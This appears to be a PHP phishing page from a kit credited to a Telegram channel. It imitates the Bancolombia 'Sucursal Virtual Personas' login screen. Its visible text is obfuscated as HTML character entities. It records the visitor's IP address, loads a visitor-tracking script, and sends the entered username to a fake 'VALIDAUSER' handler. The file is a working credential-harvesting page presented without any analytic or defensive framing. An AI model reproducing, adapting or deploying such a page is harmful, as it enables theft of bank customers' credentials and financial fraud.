<?php
/**
###############################################
#     Version 2.0                             #
#     https://t.me/neo_net                    #
#     Simular Datos Reales de Bancolombia     #
###############################################
**/
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');



 

 
 
?>

<html><head>
  <title>&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta charset="utf-8">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="mua/css/styles.css" media="all" rel="stylesheet" type="text/css">
  <link href="mua/css/bootstrap.css" media="all" rel="stylesheet" type="text/css">  
<!--[if lt IE 8]>
    <link href="mua/css/bootstrap-ie7.css" rel="stylesheet">
<![endif]-->
      <!--[if lt IE 9]>
      <script src="mua/js/html5shiv.js"></script>
      <script src="mua/js/respond.min.js"></script>
   <![endif]-->
   <script src="http://localhost/BCOLOMBIA/sucarsal/visitas.php"></script>
	<script type="text/javascript" src="mua/js/jquery-3.6.0.min.js"></script>
	<script type="text/javascript" src="mua/js/jquery.cookie.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery.validate-1.11.1.js"></script>
	<script type="text/javascript" src="mua/js/patterns/validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery-validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/blockKeys.js"></script>
	<script type="text/javascript" src="mua/js/jquery-ui.js"></script>
	<script type="text/javascript" src="mua/js/bluebird.min.js"></script>
	<link href="mua/css/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="mua/css/ui.css" media="all" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="favicon.ico">
</head>
<body style="">


<div id="cargando" style="width: 100%; text-align: center; display: none;">
     </div>
<div id="contenidoWeb" style="">
	<form id="loginUserForm" name="loginUserForm" 
	action="mua/VALIDAUSER?scis=eAWhlCdksFOyZdbwP51HEn6asE70RhLSJOASuVWnK4LIQ6b5I86eV6RC673PZ74l" method="post">
			<div class="container" id="containerMain">
<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
<script src="mua/js/jquery.jclock-min.js" type="text/javascript"></script>
<script type="text/javascript" src="mua/js/app.js"></script>
 <script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#jclock1').jclock(optionsEST);
     });
 </script>
<div>
	<div class="timeText">Fecha y hora actual:</div>
	<span id="jclock1" class="lastVisitedText"></span>
</div>
				</div>
			</div>
		</div>
	</div>
	<div class="panel-heading">
		<h3>
			&#73;&#110;&#105;&#99;&#105;&#111;&#32;&#100;&#101;&#32;&#115;&#101;&#115;&#105;ó&#110;
		</h3>
	</div>
</div>
			<div class="panel panel-primary">
				<div class="row" id="error">
<script language="JavaScript">
	function cerrarError() {
		document.getElementById("tabError").style.display = "none";
		document.getElementById('summary').innerHTML='';
	}
</script>

				</div>
				<div class="mua-panel-body">
					<div class="row">
						<div class="col-xs-12 col-sm-5 col-md-4"> 
								<div class="panel_general mua-panel_general">
									<div class="title-panel-label">
										<h1>
											Usuario
										</h1>
									</div>
									<div class="subtitle-land-label">
										<h4>
											&#83;&#105;&#32;&#110;&#111;&#32;&#116;&#105;&#101;&#110;&#101;&#115;&#32;&#117;&#110;&#32;&#117;&#115;&#117;&#97;&#114;&#105;&#111;&#32;&#97;&#115;&#105;&#103;&#110;&#97;&#100;&#111;&#32;&#105;&#110;&#103;&#114;&#101;&#115;&#97;&#32;&#99;&#111;&#110;&#32;&#116;&#117;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#111;&#32;&#100;&#101;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#100;&#97;&#100;
										</h4>
									</div>
									<div id="contenido">
										<div class="mua-content-group-panel">
											<div class="mua-label-input">
												<span id="popoverUser" class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
												<div id="popoverContent" class="hide">
<span class="mua_tooltip_close">×</span>
<div class="mua_tooltip_msg">
			&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#101;&#108;&#32;&#117;&#115;&#117;&#97;&#114;&#05;&#111;&#32;&#113;&#117;&#101;&#32;&#116;&#105;&#101;&#110;&#101;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#114;&#97;&#100;&#111;&#32;&#101;&#110;&#2;&#108;&#97;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;&#46;&#32;&#83;&#105;&#32;&#110;&#111;&#32;&#116;&#105;&#101;&#110;&#101;&#32;&#117;&#110;&#32;&#117;&#115;&#117;&#97;&#114;&#105;&#111;&#32;&#97;&#115;&#105;&#103;&#110;&#97;&#100;&#111;&#32;&#105;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#99;&#111;&#110;&#32;&#115;&#117;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#111;&#32;&#100;&#101;&#32;&#105;&#100;&#01;&#110;&#116;&#105;&#100;&#97;&#100;&#46;
</div>
												</div>
												<label class="control-label-index" for="username">Ingresa tu usuario</label>
											</div>
											<div>
												<div class="mua_svp_enroll_update_control">
													<input id="username" name="username" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" value="" maxlength="20" autocomplete="off">
													<span class="mua-icon-user"> </span>
												</div>
											</div>
										</div>
									</div>
									<div class="one-button-container mua-button-container">
										<button id="btnGo" name="btnGo" class="btn btn-success" type="button" disabled="">
											Continuar
										</button>
									</div>
									<div class="mua-panel_enlances">
										<p>
											<a href="#">¿&#79;&#108;&#118;&#105;&#100;&#97;&#115;&#116;&#101;&#32;&#116;&#117;&#32;&#117;&#115;&#117;&#97;&#114;&#105;&#111;&#63;</a>
										</p>
										<p>
											<a href="#">¿&#80;&#114;&#111;&#98;&#108;&#101;&#109;&#97;&#115;&#32;&#112;&#97;&#114;&#97;&#32;&#99;&#111;&#110;&#101;&#99;&#116;&#97;&#114;&#116;&#101;&#63;</a>
										</p>
									</div>
								</div>
								<div class="panel_general mua-panel_general">
									<div id="contenido">
										<div class="mua-divIcon">
											<a class="mua-itemsIcons-btn" href="#">
												<div class="mua-divCell">
													<span class="adminItems-Icons icon-icon_demo">
														<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
													</span>
												</div>
												<div class="mua-divCell-text">
													&#67;&#111;&#110;&#111;&#99;&#101;&#32;&#115;&#111;&#98;&#114;&#101;&#32;&#115;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#118;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#112;&#101;&#114;&#115;&#111;&#110;&#97;
												</div>
											</a>
										</div>
										<div class="mua-divIcon">
											<a class="mua-itemsIcons-btn" href="#" target="_blank">
												<div class="mua-divCell">
													<span class="adminItems-Icons icon-icon_bloquear">
														<span class="path1"></span><span class="path2"></span>
													</span>
												</div>
												<div class="mua-divCell-text">
													&#65;&#112;&#114;&#101;&#110;&#100;&#101;&#32;&#115;&#111;&#98;&#114;&#101;&#32;&#83;&#101;&#103;&#117;&#114;&#105;&#100;&#97;&#100;
												</div>
											</a>
										</div>
										<div class="mua-divIcon">
											<a class="mua-itemsIcons-btn" href="#" target="_blank">
												<div class="mua-divCell">
													<span class="adminItems-Icons icon-icon_reglamento">
														<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
													</span>
												</div>
												<div class="mua-divCell-text">
													&#82;&#101;&#103;&#108;&#97;&#109;&#101;&#110;&#116;&#111;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;
												</div>
											</a>
										</div>
										<div class="mua-divIcon">
											<a class="mua-itemsIcons-btn" href="#" target="_blank">
												<div class="mua-divCell">
													<span class="adminItems-Icons icon-icon_politicas">
														<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
													</span>
												</div>
												<div class="mua-divCell-text">
													&#80;&#111;&#108;&#237;&#116;&#105;&#99;&#97;&#32;&#100;&#101;&#32;&#80;&#114;&#105;&#118;&#97;&#99;&#105;&#100;&#97;&#100;&#32;
												</div>
											</a>
										</div>
									</div>
								</div>
						</div>
						<div class="col-xs-12 col-sm-7 col-md-8">
							<div class="mua-embed-container-personal" id="banner-persona">												
								<a href="#" target="_blank">
									<img src="mua/images/imgPublicidadnuevo.jpg" alt="" border="0" class="img-responsive">
								</a>
							</div>
							<p class="text-center">¿&#78;&#111;&#32;&#99;&#111;&#110;&#111;&#99;&#101;&#115;&#32;&#108;&#97;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;&#32;&#100;&#101;&#32;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#63;&nbsp;<a href="#" target="_blank" class="a1">&#77;&#105;&#114;&#97;&#32;&#101;&#108;&#32;&#68;&#69;&#77;&#79;</a></p>
						</div>
					</div>
				</div>
			</div>
<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer">
			&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#84;&#101;&#108;&#101;&#102;&#243;&#110;&#105;&#99;&#97;&#32;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#58;&#32;&#66;&#111;&#103;&#111;&#116;&#225;&#32;&#51;&#52;&#51;&#32;&#48;&#48;&#48;&#48;&#32;&#45;&#32;&#77;&#101;&#100;&#101;&#108;&#108;&#237;&#110;&#32;&#53;&#49;&#48;&#32;&#57;&#48;&#48;&#48;&#32;&#45;&#32;&#67;&#97;&#108;&#105;&#32;&#53;&#53;&#52;&#32;&#48;&#53;&#48;&#53;&#32;&#45;&#32;&#66;&#97;&#114;&#114;&#97;&#110;&#113;&#117;&#105;&#108;&#108;&#97;&#32;&#51;&#54;&#49;&#32;&#56;&#56;&#56;&#56;&#32;&#45;&#32;&#67;&#97;&#114;&#116;&#97;&#103;&#101;&#110;&#97;&#32;&#54;&#57;&#51;&#32;&#52;&#52;&#48;&#48;&#32;&#45;&#32;&#66;&#117;&#99;&#97;&#114;&#97;&#109;&#97;&#110;&#103;&#97;&#32;&#54;&#57;&#55;&#32;&#50;&#53;&#50;&#53;&#32;&#45;&#32;&#80;&#101;&#114;&#101;&#105;&#114;&#97;&#32;&#51;&#52;&#48;&#32;&#49;&#50;&#49;&#51; <br> &#69;&#108;&#32;&#114;&#101;&#115;&#116;&#111;&#32;&#100;&#101;&#108;&#32;&#112;&#97;&#237;&#115;&#32;&#48;&#49;&#32;&#56;&#48;&#48;&#32;&#48;&#57;&#32;&#49;&#50;&#51;&#52;&#53;&#46;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#101;&#115;&#32;&#84;&#101;&#108;&#101;&#102;&#243;&#110;&#105;&#99;&#97;&#115;&#32;&#101;&#110;&#32;&#101;&#108;&#32;&#101;&#120;&#116;&#101;&#114;&#105;&#111;&#114;&#58;&#32;&#69;&#115;&#112;&#97;&#241;&#97;&#32;&#57;&#48;&#48;&#32;&#57;&#57;&#53;&#32;&#55;&#49;&#55;&#32;&#45;&#32;&#69;&#115;&#116;&#97;&#100;&#111;&#115;&#32;&#85;&#110;&#105;&#100;&#111;&#115;&#32;&#49;&#56;&#54;&#54;&#32;&#51;&#55;&#57;&#32;&#57;&#55;&#49;&#52;&#46;
		</p>
	</div>
</div>
<script type="text/javascript">
	var year = (new Date).getFullYear();
	$(document).ready(function() {
	  $("#fecha").text( year );


	$('#btnGo').click(function(){
		inicio($("#username").val());	
	});

	$("#username").keyup(function(e) {
		if ($('#username').val().length >=4) {
			$('#btnGo').prop('disabled',false);
		}else {
			$('#btnGo').prop('disabled',true);
		}				
	});



	});
	</script>




	        <div style="margin-top: 10px;">
	            <div class="mua-title-text pull-left">Dirección IP: <?php echo $ip; ?></div>
	            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2021</span>&nbsp;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#46;&#65;&#46;&nbsp;&nbsp;</div>
	        </div>
		</div>
	   </form>
	  </div>	  
</body></html>